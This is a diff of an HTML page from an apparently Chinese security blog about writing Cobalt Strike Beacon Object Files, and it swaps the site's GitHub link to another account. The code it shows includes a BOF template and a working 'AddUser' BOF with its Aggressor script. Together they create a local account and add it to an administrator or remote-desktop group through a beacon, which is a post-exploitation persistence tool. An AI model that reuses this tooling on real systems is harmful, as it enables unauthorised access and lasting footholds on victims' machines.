@@ -19,7 +19,7 @@
 <meta property="og:image" content="https://3inter.net/assets/image-20250527133849-qo063at.png">
 <meta property="og:image" content="https://3inter.net/assets/image-20250527135427-smkc2gl.png">
 <meta property="article:published_time" content="2025-05-28T02:45:28.000Z">
-<meta property="article:modified_time" content="2025-05-28T08:51:18.658Z">
+<meta property="article:modified_time" content="2025-09-17T05:58:52.634Z">
 <meta property="article:author" content="3inter">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://3inter.net/assets/image-20250527133608-c1i060d.png">
@@ -110,7 +110,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </span>
@@ -203,9 +203,34 @@
 <p> <img src="/assets/image-20250527133849-qo063at.png" alt="image"></p>
 <p> <del>直接编译报错</del></p>
 <p> <strong>生成后事件改为</strong></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">​xcopy /y &quot;(SolutionDir)bin\$(Configuration)\$(ProjectName).x64.o*&quot;; powershell -ExecutionPolicy Unrestricted -command &quot;&amp; &#123; . &#x27;(SolutionDir)bin\$(Configuration)\$(ProjectName).x64.obj&#x27; &#125;&quot;<br></code></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-none"><code class="language-none">​xcopy &#x2F;y &quot;(SolutionDir)bin\$(Configuration)\$(ProjectName).x64.o*&quot;; powershell -ExecutionPolicy Unrestricted -command &quot;&amp; &#123; . &#39;(SolutionDir)bin\$(Configuration)\$(ProjectName).x64.obj&#39; &#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>语言万能开头 <code>用字符串来表达</code>​</p>
- <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bofdefs.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">go</span><span class="hljs-params">(<span class="hljs-type">char</span>* buff, <span class="hljs-type">int</span> len)</span> </span>&#123;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> BOF</span><br><br>    <span class="hljs-built_in">DFR_LOCAL</span>(NETAPI32, DsGetDcNameA);<br>    <span class="hljs-built_in">DFR_LOCAL</span>(NETAPI32, NetApiBufferFree);<br>    <span class="hljs-built_in">DFR_LOCAL</span>(KERNEL32, WinExec);<br>    <span class="hljs-comment">//add ...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-built_in">BeaconPrintf</span>(CALLBACK_OUTPUT, <span class="hljs-string">&quot;The quieter you become, the more you are able to hear&quot;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BOF</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br><br>    <span class="hljs-built_in">go</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>
+ <pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"bofdefs.h"</span></span>
+
+<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">&#123;</span>
+
+<span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buff<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">BOF</span></span>
+
+    <span class="token function">DFR_LOCAL</span><span class="token punctuation">(</span>NETAPI32<span class="token punctuation">,</span> DsGetDcNameA<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">DFR_LOCAL</span><span class="token punctuation">(</span>NETAPI32<span class="token punctuation">,</span> NetApiBufferFree<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">DFR_LOCAL</span><span class="token punctuation">(</span>KERNEL32<span class="token punctuation">,</span> WinExec<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//add ...</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+        <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_OUTPUT<span class="token punctuation">,</span> <span class="token string">"The quieter you become, the more you are able to hear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">BOF</span></span>
+
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token function">go</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> <img src="/assets/image-20250527135427-smkc2gl.png" alt="image"></p>
 </li>
@@ -217,10 +242,116 @@
 <li><p>添加用户</p>
 <p> 描述：BOF 创建用户名</p>
 <p> <strong>cna 代码</strong></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">beacon_command_register(<br>&quot;AddUser&quot;, <br>&quot;add a administrator&#x27;s user&quot;, <br>&quot;Synopsis: AddUser &lt;groupname&gt; &lt;username&gt; &lt;password&gt;&quot;);<br><br>alias AddUser&#123;<br>    local(&#x27;$barch $handle $data $args&#x27;);<br>    $gname = $2;<br>    $uname = $3;<br>    $pass = $4;<br><br>    if ($uname eq &quot;&quot; or $pass eq &quot;&quot;) &#123;<br>        berror($1, &quot;usage command: help AddUser&quot;);<br>        return;<br>    &#125;<br><br>    # Read in the right BOF file<br>    # figure out the arch of this session<br>    $barch  = barch($1);<br><br>    # read in the right BOF file<br>        $handle = openf(script_resource(&quot;dist/AddUser-Bof. $+ $barch $+ .o&quot;));<br>    $data = readb($handle, -1);<br>    closef($handle);<br><br>    # Pack our arguments<br>    $args = bof_pack($1, &quot;ZZZ&quot;,$gname, $uname, $pass);<br><br>    beacon_inline_execute($1, $data, &quot;go&quot;, $args);<br>&#125;<br></code></pre></td></tr></table></figure>
+ <pre class="line-numbers language-none"><code class="language-none">beacon_command_register(
+&quot;AddUser&quot;, 
+&quot;add a administrator&#39;s user&quot;, 
+&quot;Synopsis: AddUser &lt;groupname&gt; &lt;username&gt; &lt;password&gt;&quot;);
+
+alias AddUser&#123;
+    local(&#39;$barch $handle $data $args&#39;);
+    $gname &#x3D; $2;
+    $uname &#x3D; $3;
+    $pass &#x3D; $4;
+
+    if ($uname eq &quot;&quot; or $pass eq &quot;&quot;) &#123;
+        berror($1, &quot;usage command: help AddUser&quot;);
+        return;
+    &#125;
+
+    # Read in the right BOF file
+    # figure out the arch of this session
+    $barch  &#x3D; barch($1);
+
+    # read in the right BOF file
+        $handle &#x3D; openf(script_resource(&quot;dist&#x2F;AddUser-Bof. $+ $barch $+ .o&quot;));
+    $data &#x3D; readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args &#x3D; bof_pack($1, &quot;ZZZ&quot;,$gname, $uname, $pass);
+
+    beacon_inline_execute($1, $data, &quot;go&quot;, $args);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> <strong>BOF 代码</strong></p>
- <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**************************************************************************</span><br><span class="hljs-comment">Copyright Copyright 2025 Google Inc.</span><br><span class="hljs-comment">* File Name: Source.c</span><br><span class="hljs-comment">* Description: 抱歉原有逻辑实在不忍直视,所以进行了略微更改，尊重原作者:https://github.com/0x3rhy/AddUser-Bof/blob/main/AddUser-Bof.c</span><br><span class="hljs-comment">                增加组名考虑到需要远程桌面组，还需要再修改，于是改为变量传参 ^-^ *</span><br><span class="hljs-comment">* Version: V1.0</span><br><span class="hljs-comment">* Author: 3inter</span><br><span class="hljs-comment">* Create Time: 2025-05-28</span><br><span class="hljs-comment">**************************************************************************/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;lm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;beacon.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> DWORD NET_API_STATUS;<br><br>DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);<br>DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">go</span><span class="hljs-params">(<span class="hljs-type">char</span>* args, <span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!BeaconIsAdmin()) &#123;<br>        BeaconPrintf(CALLBACK_ERROR, <span class="hljs-string">&quot;[!] You must be admin priv!&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    USER_INFO_1 UserInfo;<br>    DWORD dwLevel = <span class="hljs-number">1</span>;<br>    DWORD dwError = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">wchar_t</span>* GroupName;<br>    <span class="hljs-type">wchar_t</span>* UserName;<br>    <span class="hljs-type">wchar_t</span>* PassWord;<br><br>    datap parser;<br>    BeaconDataParse(&amp;parser, args, len);<br>    GroupName = (<span class="hljs-type">wchar_t</span>*)BeaconDataExtract(&amp;parser, <span class="hljs-literal">NULL</span>);<br>    UserName = (<span class="hljs-type">wchar_t</span>*)BeaconDataExtract(&amp;parser, <span class="hljs-literal">NULL</span>);<br>    PassWord = (<span class="hljs-type">wchar_t</span>*)BeaconDataExtract(&amp;parser, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (UserName == <span class="hljs-literal">NULL</span> || PassWord == <span class="hljs-literal">NULL</span>) &#123;<br>        BeaconPrintf(CALLBACK_ERROR, <span class="hljs-string">&quot;[!] Invalid argument...\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    UserInfo.usri1_name = UserName;<br>    UserInfo.usri1_password = PassWord;<br>    UserInfo.usri1_priv = USER_PRIV_USER;<br>    UserInfo.usri1_home_dir = <span class="hljs-literal">NULL</span>;<br>    UserInfo.usri1_comment = <span class="hljs-literal">NULL</span>;<br>    UserInfo.usri1_flags = UF_SCRIPT;<br>    UserInfo.usri1_script_path = <span class="hljs-literal">NULL</span>;<br><br>    NET_API_STATUS dwStatus;<br><br>    dwStatus = NETAPI32$NetUserAdd(<br>        <span class="hljs-literal">NULL</span>,<br>        dwLevel,<br>        (LPBYTE)&amp;UserInfo,<br>        &amp;dwError<br>    );<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (!dwStatus == NERR_Success) &#123;<br>            BeaconPrintf(CALLBACK_ERROR, <span class="hljs-string">&quot;[!] User added Filed %d&quot;</span>, dwStatus);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        LOCALGROUP_MEMBERS_INFO_3 account = &#123;<span class="hljs-number">0</span>&#125;;<br>        account.lgrmi3_domainandname = UserInfo.usri1_name;<br><br>        dwStatus = NETAPI32$NetLocalGroupAddMembers(<span class="hljs-literal">NULL</span>, GroupName, <span class="hljs-number">3</span>, (LPBYTE)&amp;account, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (!dwStatus == NERR_Success)<br>        &#123;<br>            BeaconPrintf(CALLBACK_ERROR, <span class="hljs-string">&quot;[!] User added Filed %d&quot;</span>, dwStatus);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        BeaconPrintf(CALLBACK_OUTPUT, <span class="hljs-string">&quot;[*] username: %ls\n    password: %ls\n&quot;</span>, UserName, PassWord);<br>        BeaconPrintf(CALLBACK_OUTPUT, <span class="hljs-string">&quot;[*] User %ls has been successfully added&quot;</span>, UserName);<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/**************************************************************************
+Copyright Copyright 2025 Google Inc.
+* File Name: Source.c
+* Description: 抱歉原有逻辑实在不忍直视,所以进行了略微更改，尊重原作者:https://github.com/0x3rhy/AddUser-Bof/blob/main/AddUser-Bof.c
+                增加组名考虑到需要远程桌面组，还需要再修改，于是改为变量传参 ^-^ *
+* Version: V1.0
+* Author: 3inter
+* Create Time: 2025-05-28
+**************************************************************************/</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;lm.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"beacon.h"</span></span>
+
+<span class="token keyword">typedef</span> DWORD NET_API_STATUS<span class="token punctuation">;</span>
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$<span class="token function">NetUserAdd</span><span class="token punctuation">(</span>LPWSTR<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> PBYTE<span class="token punctuation">,</span> PDWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$<span class="token function">NetLocalGroupAddMembers</span><span class="token punctuation">(</span>LPCWSTR<span class="token punctuation">,</span> LPCWSTR<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> PBYTE<span class="token punctuation">,</span> DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> args<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BeaconIsAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"[!] You must be admin priv!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    USER_INFO_1 UserInfo<span class="token punctuation">;</span>
+    DWORD dwLevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    DWORD dwError <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token class-name">wchar_t</span><span class="token operator">*</span> GroupName<span class="token punctuation">;</span>
+    <span class="token class-name">wchar_t</span><span class="token operator">*</span> UserName<span class="token punctuation">;</span>
+    <span class="token class-name">wchar_t</span><span class="token operator">*</span> PassWord<span class="token punctuation">;</span>
+
+    datap parser<span class="token punctuation">;</span>
+    <span class="token function">BeaconDataParse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> args<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    GroupName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">BeaconDataExtract</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    UserName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">BeaconDataExtract</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    PassWord <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">BeaconDataExtract</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>UserName <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> PassWord <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"[!] Invalid argument...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_name <span class="token operator">=</span> UserName<span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_password <span class="token operator">=</span> PassWord<span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_priv <span class="token operator">=</span> USER_PRIV_USER<span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_home_dir <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_comment <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_flags <span class="token operator">=</span> UF_SCRIPT<span class="token punctuation">;</span>
+    UserInfo<span class="token punctuation">.</span>usri1_script_path <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+    NET_API_STATUS dwStatus<span class="token punctuation">;</span>
+
+    dwStatus <span class="token operator">=</span> NETAPI32$<span class="token function">NetUserAdd</span><span class="token punctuation">(</span>
+        <span class="token constant">NULL</span><span class="token punctuation">,</span>
+        dwLevel<span class="token punctuation">,</span>
+        <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>UserInfo<span class="token punctuation">,</span>
+        <span class="token operator">&amp;</span>dwError
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">do</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dwStatus <span class="token operator">==</span> NERR_Success<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"[!] User added Filed %d"</span><span class="token punctuation">,</span> dwStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        LOCALGROUP_MEMBERS_INFO_3 account <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        account<span class="token punctuation">.</span>lgrmi3_domainandname <span class="token operator">=</span> UserInfo<span class="token punctuation">.</span>usri1_name<span class="token punctuation">;</span>
+
+        dwStatus <span class="token operator">=</span> NETAPI32$<span class="token function">NetLocalGroupAddMembers</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> GroupName<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>account<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dwStatus <span class="token operator">==</span> NERR_Success<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"[!] User added Filed %d"</span><span class="token punctuation">,</span> dwStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_OUTPUT<span class="token punctuation">,</span> <span class="token string">"[*] username: %ls\n    password: %ls\n"</span><span class="token punctuation">,</span> UserName<span class="token punctuation">,</span> PassWord<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_OUTPUT<span class="token punctuation">,</span> <span class="token string">"[*] User %ls has been successfully added"</span><span class="token punctuation">,</span> UserName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>待完成….</p>
 <ul>
 <li><input disabled="" type="checkbox"> ToDoList(实现再更)</li>
@@ -247,7 +378,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </div>
@@ -299,7 +430,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
         
       </ul>
     </nav>
